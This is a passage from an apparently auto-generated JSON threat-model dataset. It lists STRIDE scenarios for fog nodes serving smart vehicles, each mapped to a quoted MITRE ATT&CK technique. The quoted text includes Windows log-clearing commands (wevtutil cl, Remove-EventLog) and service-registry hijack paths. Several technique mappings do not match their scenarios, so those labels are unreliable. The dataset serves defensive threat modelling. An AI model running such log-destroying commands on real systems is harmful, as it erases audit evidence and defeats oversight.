                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Adversary alters data stored within fog nodes",
            "Assumptions": [
                {
                    "Assumption": "Data stored on fog nodes is not encrypted or integrity protected.",
                    "Role": "System Architect",
                    "Condition": "Stored data lacks encryption and integrity checks."
                },
                {
                    "Assumption": "Adversary gains necessary access to fog nodes.",
                    "Role": "Threat Actor",
                    "Condition": "Access could be gained through exploitation or physical means."
                },
                {
                    "Assumption": "Fog nodes do not perform regular integrity checks on stored data.",
                    "Role": "System Administrator",
                    "Condition": "Absence of frequent and robust integrity validation mechanisms."
                }
            ],
            "Potential Impact": "Integrity loss and potential loss of confidentiality",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "storage",
                "data",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Adversary performs unauthorized operations on fog nodes and denies the actions",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes lack proper logging mechanisms for user actions.",
                    "Role": "System Designer",
                    "Condition": "Logging is inadequate or non-existent."
                },
                {
                    "Assumption": "Adversary performs actions that typically go unlogged.",
                    "Role": "Threat Actor",
                    "Condition": "Actions are untracked due to poor logging systems."
                },
                {
                    "Assumption": "System does not use non-repudiation protocols.",
                    "Role": "System Architect",
                    "Condition": "The protocols are absent or inadequately implemented."
                }
            ],
            "Potential Impact": "Lack of accountability leading to system integrity issues",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "operations",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Adversary denies sending malicious data to fog nodes",
            "Assumptions": [
                {
                    "Assumption": "There is no record of data sent by smart vehicles.",
                    "Role": "System Designer",
                    "Condition": "Lack of data logging and tracking."
                },
                {
                    "Assumption": "Adversary has compromised a smart vehicle anonymously.",
                    "Role": "Threat Actor",
                    "Condition": "The vehicle's identity can be masked or manipulated."
                },
                {
                    "Assumption": "Fog nodes do not implement data origin validation.",
                    "Role": "System Administrator",
                    "Condition": "System does not use mechanisms to verify the origin of data."
                }
            ],
            "Potential Impact": "System integrity and confidentiality loss",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data",
                "validation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Action logs are tampered with to mask unauthorized fog node access",
            "Assumptions": [
                {
                    "Assumption": "Logs on fog nodes are not protected against tampering.",
                    "Role": "System Administrator",
                    "Condition": "Logs are stored insecurely."
                },
                {
                    "Assumption": "Adversary has sufficient access rights to modify logs.",
                    "Role": "Threat Actor",
                    "Condition": "Access rights and privileges are improperly managed."
                },
                {
                    "Assumption": "No additional mechanisms exist to ensure log integrity.",
                    "Role": "System Designer",
                    "Condition": "Integrity validation mechanisms are lacking for logs."
                }
            ],
            "Potential Impact": "Loss of accountability and system integrity",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Information intercepted during Edge-Fog data flows",
            "Assumptions": [
                {
                    "Assumption": "Data sent between smart vehicles and fog nodes is unencrypted.",
                    "Role": "System Designer",
                    "Condition": "Data transmissions are not encrypted."
                },
                {
                    "Assumption": "Adversary has access to the communication channels.",
                    "Role": "Threat Actor",
                    "Condition": "Access to and control over the network."
                },
                {
                    "Assumption": "Data flow lacks additional protective layers.",
                    "Role": "System Architect",
                    "Condition": "No additional protective measures like VPNs or secure channels are employed."
                }
            ],
            "Potential Impact": "Confidentiality breach",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "interception",
                "transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored on fog nodes accessed without authorization",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not encrypt stored data.",
                    "Role": "System Architect",
                    "Condition": "Data is stored in plaintext."
                },
                {
                    "Assumption": "Adversary achieves access to fog nodes' storage.",
                    "Role": "Threat Actor",
                    "Condition": "Access is gained through exploitation or physical means."
                },
                {
                    "Assumption": "Access control policies are weak or poorly implemented.",
                    "Role": "System Administrator",
                    "Condition": "Access permissions are not adequately managed."
                }
            ],
            "Potential Impact": "Confidentiality compromise leading to sensitive data exposure",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "storage",
                "access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Adversary intercepts data during Fog-Cloud communications",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions between fog nodes and cloud services are unencrypted.",
                    "Role": "System Architect",
                    "Condition": "Communication channels are not encrypted."
                },
                {
                    "Assumption": "Adversary can monitor traffic between fog nodes and cloud services.",
                    "Role": "Threat Actor",
                    "Condition": "The adversary is positioned to intercept the network traffic."
                },
                {
                    "Assumption": "No additional security measures protect the data in transit.",
                    "Role": "System Designer",
                    "Condition": "Absence of secure transmission protocols or VPN."
                }
            ],
            "Potential Impact": "Confidentiality breach",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "interception",
                "transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding fog nodes with excessive data, causing system disruption",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes lack mechanisms to protect against high traffic volumes.",
                    "Role": "System Designer",
                    "Condition": "Denial of Service (DoS) protections are missing or inadequate."
                },
                {
                    "Assumption": "Adversary can generate or influence large data traffic.",
                    "Role": "Threat Actor",
                    "Condition": "Adversary has significant control over data generation in the network."
                },
                {
                    "Assumption": "System does not detect and mitigate high traffic promptly.",
                    "Role": "System Administrator",
                    "Condition": "No real-time monitoring or automatic mitigation solutions in place."
                }
            ],
            "Potential Impact": "Availability disrupted",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flooding",
                "network"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Service disruption by exploiting vulnerabilities in fog node software",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes run software with unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Software maintenance and updates are not handled timely."
                },
                {
                    "Assumption": "Adversary has knowledge of existing vulnerabilities.",
                    "Role": "Threat Actor",
                    "Condition": "Adversary remains updated with public vulnerability disclosures."
                },
                {
                    "Assumption": "No safeguards are present to mitigate software exploitation.",
                    "Role": "System Architect",
                    "Condition": "System lacks intrusion detection or prevention capabilities."
                }
            ],
            "Potential Impact": "System availability and integrity compromised",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "software",
                "exploitation",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware attack disables fog node functionality",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes lack effective malware protection.",
                    "Role": "System Administrator",
                    "Condition": "Anti-malware solutions are non-existent or inadequate."
                },
                {
                    "Assumption": "Adversary can deploy malicious software on fog nodes.",
                    "Role": "Threat Actor",
                    "Condition": "Gaining access via remote exploitation or physical access."
                },
                {
                    "Assumption": "No robust isolation techniques to prevent spread of malware.",
                    "Role": "System Designer",
                    "Condition": "Network and system architecture lack adequate isolation methods."
                }
            ],
            "Potential Impact": "Service availability critically affected",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "network",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Adversary exploits software bugs to gain administrative control over fog nodes",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes run software with known vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Vulnerabilities are unpatched or not disclosed."
                },
                {
                    "Assumption": "Adversary has the necessary skill to exploit these vulnerabilities.",
                    "Role": "Threat Actor",
                    "Condition": "Adversary has the skillset to leverage software bugs."
                },
                {
                    "Assumption": "Access control measures on fog nodes are weak.",
                    "Role": "System Designer",
                    "Condition": "Implementation of access control measures is inadequate."
                }
            ],
            "Potential Impact": "Compromise of system integrity and confidentiality",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "exploitation",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Adversary leverages insecure configurations to gain elevated privileges on fog nodes",
            "Assumptions": [
                {
                    "Assumption": "Configurations on fog nodes are not securely managed.",
                    "Role": "System Administrator",
                    "Condition": "Default or poorly designed configurations are in use."
                },
                {
                    "Assumption": "Adversary can interact with or manipulate these configurations.",
                    "Role": "Threat Actor",
                    "Condition": "Adversary has access to configuration interfaces or channels."
                },
                {
                    "Assumption": "No effective monitoring for configuration changes.",
                    "Role": "System Designer",
                    "Condition": "System lacks mechanisms to monitor and alert on configuration modifications."
                }
            ],
            "Potential Impact": "Privilege escalation and potential integrity breach",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "configuration exploitation",
                "access control"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting weak authentication to gain higher privileges",
            "Assumptions": [
                {
                    "Assumption": "Authentication schemes on fog nodes/devices are weak or flawed.",
                    "Role": "System Architect",
                    "Condition": "Use of outdated or inadequate authentication methods."
                },
                {
                    "Assumption": "Adversary interacts with the system to identify weaknesses.",
                    "Role": "Threat Actor",
                    "Condition": "Adversary can probe and attempt various methods to bypass authentication."
                },
                {
                    "Assumption": "System does not enforce multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "Authentication relies solely on single-factor methods."
                }
            ],
            "Potential Impact": "Integrity compromise and privilege escalation",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "weak authentication",
                "access control"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "16",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate smart vehicle, sending fake data to cloud services through fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not authenticate vehicle identities before processing data.",
                    "Role": "Attacker",
                    "Condition": "Valid if fog nodes lack strict authentication mechanisms."
                },
                {
                    "Assumption": "Smart vehicles and fog nodes rely on unsecured communication channels.",
                    "Role": "Attacker",
                    "Condition": "Valid if secure communication channels like TLS are not enforced."
                },
                {
                    "Assumption": "Attackers can easily guess or obtain identifiers used by legitimate vehicles.",
                    "Role": "Attacker",
                    "Condition": "Valid if identifiers used for vehicle identity are predictable or poorly managed."
                }
            ],
            "Potential Impact": "Unauthorized access to system, fake data influencing traffic management decisions.",
